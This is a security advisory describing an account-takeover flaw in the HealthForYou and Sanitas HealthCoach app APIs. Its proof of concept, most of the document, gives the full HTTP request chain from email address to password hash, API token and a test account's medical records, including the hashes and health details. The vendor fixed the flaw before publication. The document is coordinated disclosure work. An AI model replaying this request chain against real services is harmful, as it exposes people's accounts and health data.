@@ -1,0 +1,328 @@
+id: 36360
+date: 06/04/2021
+title: HealthForYou 1.11.1 / HealthCoach 2.9.2 Account Takeover Vulnerability
+author: Nick Decker
+cves: 
+
+Account takeover with only email address possible
+#################################################
+
+
+Overview
+########
+
+Advisory ID: TRSA-2104-02
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2104-02
+Affected product: HealthForYou & Sanitas HealthCoach mobile and web applications
+Tested versions: HealthForYou 1.11.1 (com.hansdinslage.connect.HealthForYou),
+                 HealthCoach 2.9.2 (de.sanitas_online.healthcoach)
+Vendor: Hans Dinslage GmbH (subsidiary of Beurer GmbH https://www.beurer.com)
+Credits: Trovent Security GmbH, Nick Decker
+
+
+Detailed description
+####################
+
+Trovent Security GmbH discovered a critical vulnerability in the server API of
+the mobile apps Sanitas HealthCoach and HealthForYou.
+When sending an HTTP POST request to "/BHMCWebAPI/User/PostCreateNewUser"
+with only an already registered email address the server answers with all account
+settings and information. This includes for example name, height, weight and
+the password hash and salt.
+With the combination of password hash and email address an attacker is able to
+authenticate to the API and get a valid API token which leads to unrestricted
+access to all account information.
+
+Severity: Critical
+CVSS Score: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+CWE ID: CWE-305
+CVE ID: N/A
+
+
+Proof of concept
+################
+
+HealthForYou
+############
+
+Registration request made with the already registered email address of my colleague:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/User/PostCreateNewUser/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Accept-Encoding: gzip, deflate
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.healthforyou-lidl.com
+Connection: close
+Content-Length: 155
+
+{"Email":"s.pietsch@trovent.io","Gender":0,"Source":"","DOB":"","Settings":{"TimeFormat":"","MetricFormat":"","Language":"","DateFormat":""},"Password":""}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 7652
+etag: W/"1de4-FvpCxFrdDED3gZxRZasWQllO2us"
+date: Wed, 28 Apr 2021 08:47:02 GMT
+x-envoy-upstream-service-time: 354
+server: istio-envoy
+connection: close
+
+{"DOB":"1979-01-01T00:00:00","HeightCm":180,"HeightFeet":5,"HeightInch":10,"FirstName":"Stefan","LastName":"Pietsch","Gender":1,"UserLevel":"Advanced","Email":"s.pietsch@trovent.io","IsReceiveNewsLetters":false,"PersonalisedNewsletter":0,"PersonalisedNewsletterGlobalTime":"2021-04-28T07:31:53+00:00","InformationNewsLetter":0,"InformationNewsLetterGlobalTime":"2021-04-28T07:31:53+00:00","IsAcceptedTermsOfService":true,"IsAcceptedTermsOfDataProtection":true,"IsGDPRAccepted":1,"GDPRAcceptedDateTime":"2021-04-28T07:31:53+00:00","GDPRAcceptedPlatform":"WEB","culture":"de-DE","UserAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0","Browser":"Firefox","DeviceId":"000007","EmailSalt":"XiiUAhAKCz8WV2aZNOaV6jXa92otbM2","UniqueId":"1a446ba9-f9c2-406e-8a05-6c7f1995bd04","UserID1":1209134,"password":"e9WKpB5aDCQVaKyOdtHAQ3KIVMFbUOy","EncryptedPassword":"e9WKpB5aDCQVaKyOdtHAQ3KIVMFbUOy","salt":"$2b$10$R1SSik1t5io45rjMwUIgre",[shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+The email address and password hash can be used to get a valid API token:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/Common/LoginToAPI/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.healthforyou-lidl.com
+Connection: close
+Accept-Encoding: gzip, deflate
+Content-Length: 123
+
+{"UserName":"s.pietsch@trovent.io","Password":"e9WKpB5aDCQVaKyOdtHAQ3KIVMFbUOy","ApplicationVersion":"","LoginPlatform":""}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 183
+etag: W/"b7-nVpWy2Vb0LEGcXhvWiklrpw7W3g"
+date: Wed, 28 Apr 2021 11:17:11 GMT
+x-envoy-upstream-service-time: 82
+server: istio-envoy
+connection: close
+
+{"UserStatus":"Valid","AccessToken":"7c68b406-c95e-4e85-ac1d-8ca9b68769a0","ConsiderServerSyncInterval":1,"SyncIntervalTime":60,"AccessTokenExpirationDateTime":"2021-04-28T11:42:11Z"}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+This access token allows us to fetch all medical information of the account:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/Synchronization/PostDownloadDataFromCloud/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Authorization: Android##7c68b406-c95e-4e85-ac1d-8ca9b68769a0
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.healthforyou-lidl.com
+Connection: close
+Accept-Encoding: gzip, deflate
+Content-Length: 841
+
+{"ASSettingsLastCount": 0,"ASDeviceSettingsLastCount": 0,"DeviceClassDurationSettingsLastCount": 0,"GlucoseMeasurementLastCount": 0,"GlucoseSettingsLastCount": 0,"MeasurementMedicationRefLastCount": 0,"MeasurementsLastCount": 0,"MedicationLastCount": 0,"ScaleMeasurementLastCount": 0,"UserLastCount": 0,"SettingsLastCount": 0,"UserDevicesLastCount": 0,"UserTargetWeightLastCount": 0,"UserWHRManagementLastCount": 0,"ASMeasurementsLastCount": 0,"ASMeasurementDetailsLastCount": 0,"SleepDetailsLastCount": 0,"SleepMasterLastCount": 0,"POMeasurementLastCount": 0,"WeightSettingsLastCount": 0,"WaterSettingsLastCount": 0,"TemperatureMeasurementsLastCount": 0,"WaterMeasurementsLastCount": 0,"UserProfilePicLastCount": 0,"SourcePlateform":"","FinalIdentifier":"","SourcePrefix":"","LastSyncDateForDownlaodTables":"","CurrentPlateformVersions":""}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: text/html; charset=utf-8
+content-length: 4790
+etag: W/"12b6-dokpw3kZxXpKH0Lj7TmslcLZjuM"
+date: Wed, 28 Apr 2021 08:45:42 GMT
+x-envoy-upstream-service-time: 67
+server: istio-envoy
+connection: close
+
+{"objSyncDownload":{"MeasurementsLastCount":1,"ScaleMeasurementLastCount":0,"UserWHRManagementLastCount":0,"UserTargetWeightLastCount":0,"SleepMasterLastCount":0,"TemperatureMeasurementsLastCount":1,"WaterMeasurementsLastCount":0,"WaterSettingsLastCount":1,"ScaleSettingsLastCount":1,"WeightSettingsLastCount":1,"ASDeviceSettingsLastCount":0,"UserLastCount":7,"UserProfilePicLastCount":0},"objSyncDownloadRecordsCount":{"BloodPressureMeasurementsCount":1,"DeviceClassDurationSettingsCount":0,"TemperatureMeasurementsLastCount":1,"WaterSettingsLastCount":1,"ScaleSettingsLastCount":1,"WeightSettingsLastCount":1},"bpMeasurement":[{"MeasurementTime":"09:00:00","MeasurementDate":"2021-04-28T00:00:00","Systolic":120,"Diastolic":80,"Pulse":60,"HeartRhythmDisturbance":false,"RestIndicator":false,"IncludeInGraph":true,"MeasurementID":8989,"Comment":"Meine Blutdruckwerte gehen niemanden etwas an."[shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+HealthCoach
+###########
+
+Registration request made with the already registered email address of my colleague:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/User/PostCreateNewUser/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Accept-Encoding: gzip, deflate
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.connect-sanitas-online.de
+Connection: close
+Content-Length: 161
+
+{"Email":"s.pietsch@trovent.io","UserLevel":"","Gender":0,"Source":"","Settings":{"TimeFormat":"","MetricFormat":"","Language":"","DateFormat":""},"Password":""}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 5700
+etag: W/"1644-/y9uRN4o4Qchl43H3Lv+XUNnMi0"
+date: Wed, 28 Apr 2021 11:32:39 GMT
+x-envoy-upstream-service-time: 211
+server: istio-envoy
+connection: close
+
+{"FirstName":"Stefan","LastName":"Pietsch","Gender":1,"UserLevel":"Advanced","Email":"s.pietsch@trovent.io","IsReceiveNewsLetters":false,"IsAcceptedTermsOfService":true,"IsAcceptedTermsOfDataProtection":true,"IsGDPRAccepted":1,"GDPRAcceptedDateTime":"2021-04-28T11:31:27+00:00","culture":"de-DE","EmailSalt":"XiiUAhAKCz8WV2aZNOaV6jXa92otbM2","UserID1":1054072,"password":"bykDYLPdQnU9KGJYODAs5qgufYHCkhG","EncryptedPassword":"bykDYLPdQnU9KGJYODAs5qgufYHCkhG","salt":"$2b$10$kUzS7R71yJb7nWagxPgOu."[shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+The email address and password hash can be used to get a valid API token:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/Common/LoginToAPI/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.connect-sanitas-online.de
+Connection: close
+Accept-Encoding: gzip, deflate
+Content-Length: 123
+
+{"UserName":"s.pietsch@trovent.io","Password":"bykDYLPdQnU9KGJYODAs5qgufYHCkhG","ApplicationVersion":"","LoginPlatform":""}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 149
+etag: W/"95-Xpvb6O8zVrs0Rs6A6foU+iFWItM"
+date: Wed, 28 Apr 2021 11:35:58 GMT
+x-envoy-upstream-service-time: 88
+server: istio-envoy
+connection: close
+
+{"UserStatus":"Valid","AccessToken":"9f5e81f3-3cf6-4328-88c9-a2ab9fa6a652","StartDateTime":"2020-12-01 00:00:00","EndDateTime":"2022-12-31 23:59:59"}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+This access token allows us to fetch all medical information of the account:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/Synchronization/PostDownloadDataFromCloud/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Authorization: Android##9f5e81f3-3cf6-4328-88c9-a2ab9fa6a652
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.connect-sanitas-online.de
+Connection: close
+Accept-Encoding: gzip, deflate
+Content-Length: 841
+
+{"ASSettingsLastCount": 0,"ASDeviceSettingsLastCount": 0,"DeviceClassDurationSettingsLastCount": 0,"GlucoseMeasurementLastCount": 0,"GlucoseSettingsLastCount": 0,"MeasurementMedicationRefLastCount": 0,"MeasurementsLastCount": 0,"MedicationLastCount": 0,"ScaleMeasurementLastCount": 0,"UserLastCount": 0,"SettingsLastCount": 0,"UserDevicesLastCount": 0,"UserTargetWeightLastCount": 0,"UserWHRManagementLastCount": 0,"ASMeasurementsLastCount": 0,"ASMeasurementDetailsLastCount": 0,"SleepDetailsLastCount": 0,"SleepMasterLastCount": 0,"POMeasurementLastCount": 0,"WeightSettingsLastCount": 0,"WaterSettingsLastCount": 0,"TemperatureMeasurementsLastCount": 0,"WaterMeasurementsLastCount": 0,"UserProfilePicLastCount": 0,"SourcePlateform":"","FinalIdentifier":"","SourcePrefix":"","LastSyncDateForDownlaodTables":"","CurrentPlateformVersions":""}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: text/html; charset=utf-8
+content-length: 6795
+etag: W/"1a8b-FcxjfS97a4XlahafWWa3FLI5XYQ"
+date: Wed, 28 Apr 2021 11:37:40 GMT
+x-envoy-upstream-service-time: 163
+server: istio-envoy
+connection: close
+
+{"objSyncDownload":{"ASSettingsLastCount":36,"MeasurementsLastCount":0,"DeviceClassDurationSettingsLastCount":216,"ScaleMeasurementLastCount":0,"UserWHRManagementLastCount":0,"UserTargetWeightLastCount":0,"SleepMasterLastCount":0,"MedicationLastCount":2,"MeasurementMedicationRefLastCount":0,"UserLastCount":46},"objSyncDownloadRecordsCount":{"ASSettingsCount":1,"ASMeasurementsLastCount":0,"ASMeasurementDetailsCount":0,"DeviceClassDurationSettingsCount":6,"medicationCount":1,"SettingsCount":1}[shortened for better readability][{"MedicationId":51845,"MedicationName":"Aspirin","Strength":0,"StrengthUnit":"0","Dose":1,"DoseUnit":"Tablets","HowTaken":"po","HowOftenTaken":"1","ReasonForTaking":"Kopfschmerzen","Note":"seit 1. März 2021","GlobalTime":"2021-04-28T09:01:58+02:00","Medication_HistoryId":2,"KeyIdentifier":"e10cd597-9871-4559-8504-ac81d63d4f68","Source":"WE149477286MED000001"}][shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+To mitigate this vulnerability, we recommend to verify both the email address
+and password before sending account settings and information back to the client.
+
+
+History
+#######
+
+2021-04-27: Vulnerability found
+2021-04-28: Advisory created, vendor and BSI contacted
+2021-04-30: Vendor reported to Trovent and BSI that the vulnerability was fixed
+2021-05-03: Fix validated by Trovent
+2021-06-04: Advisory published
+
+#  0day.today [2023-03-26]  #
